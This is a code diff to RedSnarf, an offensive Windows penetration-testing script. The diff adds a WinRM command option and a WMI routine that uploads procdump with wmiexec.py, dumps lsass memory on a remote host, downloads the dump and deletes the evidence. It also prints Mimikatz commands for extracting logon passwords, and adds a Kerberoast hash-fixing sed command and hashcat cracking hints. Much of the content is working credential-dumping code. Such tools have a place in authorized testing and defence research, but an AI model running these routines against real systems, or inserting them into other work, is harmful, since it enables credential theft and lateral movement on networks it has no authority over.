@@ -7,7 +7,7 @@
 # I am no longer affiliated with the original project.
 
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
-import socket, fcntl, struct, time, base64, logging, urllib
+import socket, fcntl, struct, time, base64, logging, urllib, winrm
 
 import time
 import xml.etree.ElementTree as ET
@@ -1178,7 +1178,8 @@ def datadump(user, passw, host, path, os_version):
 					print colored("\n[+]Possible Weak Service Permissions saved to "+outputpath+targets[0]+'/weakservicepermissions.txt','yellow')
 					print colored("[+]Check using ",'yellow')+colored("'accesschk.exe -uwcqv %username%/everyone/users * -accepteula' ",'white')+colored("from sysinternals "+"\n",'yellow')
 
-			#Dump lsass using procdump from sysinternals
+			
+			#Dump lsass with standard connection methods and Procdump
 			if lsass_dump in yesanswers:
 				if not os.path.isfile("/opt/Procdump/procdump.exe"):
 					print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
@@ -1196,6 +1197,12 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/lsass.dmp"):
 						print colored("[+]lsass.dmp file found",'green')
+
+						print colored("[+]Info",'green')
+						print colored("\n[+]To parse - run Mimikatz",'yellow')
+						print colored("[+]Type, sekurlsa::Minidump lsass.dmp",'yellow')
+						print colored("[+]Yype, sekurlsa::logonPasswords\n",'yellow')
+
 					else:
 						print colored("[-]lsass.dmp file not found",'red')        
 						logging.error("[-]lsass.dmp file not found")
@@ -1254,6 +1261,28 @@ def datadump(user, passw, host, path, os_version):
 					#Escapes string properly								
 					command = xcommand.encode('string-escape').replace('"', '\\"')
 					os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+				except:
+					print colored("[-]Something went wrong ...",'red')
+					logging.error("[-]Something went wrong running custom command")
+
+			#Routine runs custom commands using WinRM
+			#TODO DOES NOT WORK PROPERLY, YET!
+			#NEEDS MOVING FROM THIS AREA OF THE CODE TO BE A SINGLE
+			#ON ITS OWN THING RATHER THAN BEING IN THE ENUMERATION PART
+			#https://github.com/diyan/pywinrm
+
+			if xrcommand!='n':
+				try:
+					print colored("[+]Running Command: "+xrcommand,'green')
+					#Escapes string properly								
+					command = xcommand.encode('string-escape').replace('"', '\\"')
+					s = winrm.Session(host, auth=(user,passw))
+					r = s.run_cmd('ipconfig', ['/all'])
+					print r
+					#>>> r.status_code
+					#0
+					print r.std_out
+					#os.system("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
 					logging.error("[-]Something went wrong running custom command")
@@ -2580,7 +2609,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.6b", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.6c", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2625,6 +2654,7 @@ ugroup.add_argument("-uSCF", "--scf_creator", dest="scf_creator", default="n", h
 ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
 ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+ugroup.add_argument("-uXR", "--xrcommand", dest="xrcommand", default="n", help="<Optional> Run custom command using WinRM")
 ugroup.add_argument("-uXS", "--xscript", dest="xscript", default="n", help="<Optional> Run custom script")
 ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
 ugroup.add_argument("-uWU", "--windows_updates", dest="windows_updates", default="n", help="<Optional> Get Windows Update Status")
@@ -2697,6 +2727,7 @@ clear_event=args.clear_event
 lat=args.lat
 fat=args.fat
 xcommand=args.xcommand
+xrcommand=args.xrcommand
 edq_rdp=args.edq_rdp
 edq_nla=args.edq_nla
 edq_trdp=args.edq_trdp
@@ -2770,6 +2801,7 @@ if args.password=='epass':
 	usr_response = raw_input("Enter the password here: ")
 	args.password=usr_response
 	passw=args.password
+
 
 if arp_spoof!='n':
 	#Added ARP Spoofing Attack with Ettercap
@@ -2910,6 +2942,10 @@ if split_spn!='n':
 			print colored("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file",'yellow')
 			logging.info("[+]Fixed hashes and written them to "+usr_response+".fix, try again using this file")
 			#Exit, so function can be run again
+
+			print colored("[+]Just in case the first fix hasn't worked try this fix below",'green')
+			print colored("[-]cat kerberoast.txt | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' > test.spn",'red')	
+
 			sys.exit()
 
 		#Split on the marker $krb5tgs$23$*
@@ -3223,6 +3259,7 @@ elif remotetargets[0:8]=='nmapxml=':
 
 	print colored("[+]Parsed Nmap output and found "+str(len(targets))+" target(s) in xml file\n",'yellow')
 
+
 #Function runs windows Base Line Analyser on a remote machine to get patch status.
 if windows_updates != 'n':
 	if windows_updates in yesanswers:
@@ -3372,6 +3409,51 @@ if windows_updates != 'n':
 		sys.exit()
 
 	sys.exit()
+
+#Dump lsass with WMI and Procdump
+if lsass_dump == "wmi":
+	if not os.path.isfile("/opt/Procdump/procdump.exe"):
+		print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
+		print colored("[-]Download from https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx",'yellow')
+		exit(1)
+	else:
+		print colored("[+]Procdump.exe found",'green')
+		logging.debug("[+]Procdump.exe found")
+	try:
+		print colored("[+]getting dump of lsass: "+targets[0],'green')
+		logging.debug("[+]getting dump of lsass: "+targets[0])
+		
+		#Upload procdump using wmiexec
+		os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" put /opt/Procdump/procdump.exe")
+		#Run procdump and output to lsass.dmp
+		os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" \"c:\procdump.exe -accepteula -ma lsass.exe c:\\lsass.dmp\"")
+		
+		#Clean up
+		os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" get lsass.dmp")
+		os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" del lsass.dmp")
+		os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" del procdump.exe")
+
+		#Lsass downloads to cwd - check for file then move to output folder
+		if os.path.isfile(os.getcwd()+"/lsass.dmp"):
+			os.system("mv "+os.getcwd()+"/lsass.dmp "+outputpath+targets[0]+"/lsass.dmp")
+
+
+		if os.path.isfile(outputpath+targets[0]+"/lsass.dmp"):
+			print colored("[+]"+outputpath+targets[0]+"/lsass.dmp file found",'green')
+			
+			print colored("[+]Info",'green')
+			print colored("\n[+]To parse - run Mimikatz",'yellow')
+			print colored("[+]Type, sekurlsa::Minidump lsass.dmp",'yellow')
+			print colored("[+]Type, sekurlsa::logonPasswords\n",'yellow')
+
+		else:
+			print colored("[-]lsass.dmp file not found",'red')        
+			logging.error("[-]lsass.dmp file not found")
+	except OSError:
+		print colored("[-]Something went wrong getting lsass.dmp",'red')
+		logging.error("[-]Something went wrong getting lsass.dmp")	
+
+	sys.exit()	
 
 #Function looks for accounts which have delegated privs
 if delegated_privs in yesanswers:
@@ -3838,7 +3920,7 @@ if get_spn in yesanswers or get_spn=="l":
 				print colored("[-]No SPNS's were output to file, check error logs",'red')
 			else:
 				print colored("[+]To parse a SPN hash file which contains multiple entries use",'blue')
-				print colored("[+]./redsnarf.py -uSS y",'yellow')
+				print colored("[+]./redsnarf.py --split_spn yes",'yellow')
 
 				logging.info("[+]SPN's output to "+outputpath+targets[0]+"/spns.txt")
 				print colored("\n[+]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green')
@@ -3856,14 +3938,22 @@ if get_spn in yesanswers or get_spn=="l":
 					file.write (fo)
 					file.close()
 
+					#TODO
+					#Another little improvement would be cat kerberoast.txt | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' > test.spn
+					#TODO
+
 					#Print status message
 					print colored("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix",'green')
 					logging.info("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix")
+
+					print colored("[+]Just in case the first fix hasn't worked try this fix below",'green')
+					print colored("[-]cat kerberoast.txt | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' > test.spn",'red')	
 			
 				#Check to see if Jtr Jumbo is installed
 				if jtr_jumbo_installed()!=None:
 					usr_response = raw_input("\nDo you want to start cracking with Jtr Jumbo? (y/n) : ")
 					if usr_response in noanswers:
+						print colored("[+]Hint - To crack with HASHCAT hashtype -m 13100",'yellow')
 						exit(1)
 					else:
 						print colored("[+]Sending SPN's to Jtr Jumbo",'green')
